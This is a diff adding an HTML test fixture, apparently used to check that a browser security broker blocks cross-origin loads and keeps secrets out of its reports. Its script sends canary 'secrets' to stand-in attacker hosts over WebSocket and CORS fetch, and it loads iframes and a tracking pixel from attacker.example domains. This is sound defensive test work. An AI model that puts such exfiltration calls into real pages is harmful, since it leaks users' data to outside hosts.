@@ -1,0 +1,21 @@
+<!doctype html><html><head><meta charset="utf-8">
+<title>Security boundary offline fixture</title>
+<link rel="stylesheet" href="https://compliance-fixture.invalid/assets/site.css">
+<script src="https://compliance-fixture.invalid/assets/redirect.js"></script>
+</head><body>
+<iframe src="https://compliance-fixture.invalid/" title="same-origin iframe"></iframe>
+<iframe src="https://iframe.attacker.example/private" title="cross-origin iframe"></iframe>
+<img src="https://cdn.attacker.example/pixel.png" alt="">
+<script>
+  // Test-only canaries; must not enter the broker response/report.
+  try { new WebSocket("wss://socket.attacker.example/ws?secret=WS_CANARY"); } catch {}
+  fetch("https://cors.attacker.example/collect?secret=CORS_CANARY",
+        {mode: "cors"}).catch(() => {});
+  fetch("https://compliance-fixture.invalid/api/collect?secret=API_CANARY")
+        .catch(() => {});
+  fetch("https://compliance-fixture.invalid/assets/site.css",
+        {method: "POST", body: "POST_CANARY"}).catch(() => {});
+  fetch("https://compliance-fixture.invalid/assets/redirect.js")
+        .catch(() => {});
+</script>
+</body></html>
